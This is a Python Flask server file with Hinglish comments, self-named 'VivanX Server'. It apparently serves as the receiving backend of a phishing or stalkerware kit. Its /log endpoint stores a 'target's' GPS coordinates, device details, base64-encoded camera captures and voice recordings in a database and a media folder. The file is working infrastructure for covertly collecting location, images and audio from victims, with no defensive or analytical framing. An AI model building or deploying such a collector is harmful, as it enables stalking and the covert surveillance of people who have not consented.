import os
import base64
from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
CORS(app)

# Database Configuration (SQLite database file 'data.db' banayega)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///data.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Database Table (Model) Define Karna
class TargetData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    data_type = db.Column(db.String(50))  # 'info', 'image', ya 'audio'
    latitude = db.Column(db.String(50), nullable=True)
    longitude = db.Column(db.String(50), nullable=True)
    device = db.Column(db.String(100), nullable=True)
    file_path = db.Column(db.String(200), nullable=True)  # Images/Audio ka path save karne ke liye

# Database aur Tables ko initialize karna
with app.app_context():
    db.create_all()

# Uploads folder banana jahan photos aur audio files save hongi
UPLOAD_FOLDER = 'saved_media'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

@app.route('/')
def index():
    return "VivanX Server Active"

@app.route('/log', methods=['POST'])
def log_data():
    data = request.json
    data_type = data.get('type')

    # 1. Location handle karna
    if data_type == 'info':
        lat = data.get('lat')
        lon = data.get('lon')
        dev = data.get('device')
        
        # Database me save karein
        new_entry = TargetData(data_type='info', latitude=lat, longitude=lon, device=dev)
        db.session.add(new_entry)
        db.session.commit()

    # 2. Photo handle karna
    elif data_type == 'image':
        img_base64 = data.get('image').split(',')[1]
        file_path = os.path.join(UPLOAD_FOLDER, f"capture_{os.urandom(4).hex()}.jpg")
        
        with open(file_path, "wb") as f:
            f.write(base64.b64decode(img_base64))
            
        # Database me photo ka path save karein
        new_entry = TargetData(data_type='image', file_path=file_path)
        db.session.add(new_entry)
        db.session.commit()

    # 3. Audio handle karna
    elif data_type == 'audio':
        audio_base64 = data.get('audio').split(',')[1]
        file_path = os.path.join(UPLOAD_FOLDER, f"voice_{os.urandom(4).hex()}.ogg")
        
        with open(file_path, "wb") as f:
            f.write(base64.b64decode(audio_base64))
            
        # Database me audio ka path save karein
        new_entry = TargetData(data_type='audio', file_path=file_path)
        db.session.add(new_entry)
        db.session.commit()

    return jsonify({"status": "success", "message": "Data saved to database"}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
